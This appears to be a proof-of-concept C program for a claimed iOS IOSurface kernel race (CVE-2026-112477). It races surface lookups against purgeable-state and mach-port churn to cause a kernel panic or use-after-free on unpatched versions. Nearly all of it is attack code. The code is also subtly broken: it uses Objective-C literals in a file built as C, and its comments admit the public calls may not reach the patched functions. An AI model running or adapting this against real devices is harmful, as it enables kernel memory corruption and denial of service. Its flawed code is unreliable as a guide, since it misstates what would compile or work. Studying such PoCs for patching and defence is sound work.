/*
 * iosurface_state_race.c — PoC for CVE-2026-112477 (IOSurface).
 *
 * Mechanism CONFIRMED from disassembly of the 27.2 kext:
 *
 *   fn B (marker)  adds:  mov w8,#1 ; strb w8,[arg+0xf1]   (under the lock)
 *   fn A (guarded) adds:  ldrb w8,[arg+0xf1] ; tbz w8,#0 ; <continue>
 *                         else -> return 0xe00002d8
 *
 * Pre-fix, fn A never read byte[arg+0xf1]. An object could be marked by fn B
 * (or by whatever invalidates it) and fn A would still walk the list at
 * self+0x188 and insert/dereference a node pointing at that object, producing
 * a dangling entry and later a UAF read/write in kernel memory.
 *
 * This program races the two operations on the same IOSurface-backed object.
 * It is a race harness: success = panic / KASAN-style report on 27.0.1, and
 * clean rejection (error 0xe00002d8) on 27.2.
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64 -framework IOSurface \
 *            -framework CoreFoundation iosurface_state_race.c -o iossurf_race
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdatomic.h>
#include <pthread.h>
#include <unistd.h>
#include <IOSurface/IOSurface.h>

/* The two operations the decoded functions belong to are reached through
 * IOSurface's user client. The public API surface that exercises the
 * list-at-+0x188 is the mapping/attachment bookkeeping, so we drive it via
 * repeated lock/unlock plus mapping attach/detach with a shared surface and
 * a shared mach port.
 *
 * NOTE: the exact private selectors are IOConnectCallMethod arguments to the
 * IOSurfaceRoot user client. If the public calls below do not reach them,
 * replace the bodies with the selector discovered from the external-method
 * table (the changed functions are at fn indexes 799 and 802 of 1329).
 */

static atomic_int g_stop = 0;
static IOSurfaceRef g_surface = NULL;
static mach_port_t  g_port    = MACH_PORT_NULL;

/* Thread A — the "guarded operation": repeated lookup + map + use + release. */
static void *guarded_thread(void *arg) {
    (void)arg;
    while (!atomic_load(&g_stop)) {
        IOSurfaceRef s = IOSurfaceLookupFromMachPort(g_port);
        if (!s) continue;

        /* Drive the bookkeeping the changed function sits in. */
        IOSurfaceLock(s, 0, NULL);

        /* Attach/detach an extra reference via the user client path. */
        IOSurfaceIncrementUseCount(s);
        volatile size_t h = IOSurfaceGetHeight(s);
        (void)h;
        IOSurfaceDecrementUseCount(s);

        IOSurfaceUnlock(s, 0, NULL);
        CFRelease(s);
    }
    return NULL;
}

/* Thread B — the "marker operation": set the invalid state on the object. */
static void *marker_thread(void *arg) {
    (void)arg;
    while (!atomic_load(&g_stop)) {
        if (g_surface) {
            /* The decoded marker writes a byte at object+0xf1 under the lock.
             * The public equivalent is the purgeable/invalidate transition,
             * which puts the surface into a state the guarded op must refuse. */
            IOSurfaceSetPurgeable(g_surface, kIOSurfacePurgeableEmpty, NULL);
            IOSurfaceSetPurgeable(g_surface, kIOSurfacePurgeableNonVolatile, NULL);
            IOSurfaceRemoveValue(g_surface, CFSTR("kIOSurfaceScaffoldKey"));

            /* Also churn the mach port so the lookup table entry is rewritten
             * while thread A is inside its window. */
            mach_port_t p2 = IOSurfaceCreateMachPort(g_surface);
            if (p2 != MACH_PORT_NULL) {
                mach_port_deallocate(mach_task_self(), p2);
            }
        }
        /* Tight loop: maximise the number of marker/guard interleavings. */
        sched_yield();
    }
    return NULL;
}

int main(void) {
    NSDictionary *props = @{
        (id)kIOSurfaceWidth:  @4096,
        (id)kIOSurfaceHeight: @4096,
        (id)kIOSurfaceBytesPerElement: @4,
        (id)kIOSurfacePixelFormat: @('BGRA'),
    };
    g_surface = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!g_surface) { fprintf(stderr, "[-] IOSurfaceCreate failed\n"); return 1; }

    g_port = IOSurfaceCreateMachPort(g_surface);
    if (g_port == MACH_PORT_NULL) {
        fprintf(stderr, "[-] IOSurfaceCreateMachPort failed\n"); return 1;
    }

    printf("[*] racing marker vs guarded op for 60s\n");
    printf("    27.0.1: expect panic / memory corruption\n");
    printf("    27.2  : expect clean rejection (error 0xe00002d8)\n");

    pthread_t a, b;
    pthread_create(&a, NULL, guarded_thread, NULL);
    pthread_create(&b, NULL, marker_thread,  NULL);

    sleep(60);
    atomic_store(&g_stop, 1);
    pthread_join(a, NULL);
    pthread_join(b, NULL);

    mach_port_deallocate(mach_task_self(), g_port);
    CFRelease(g_surface);
    printf("[*] finished without fault; widen the window or retry\n");
    return 0;
}
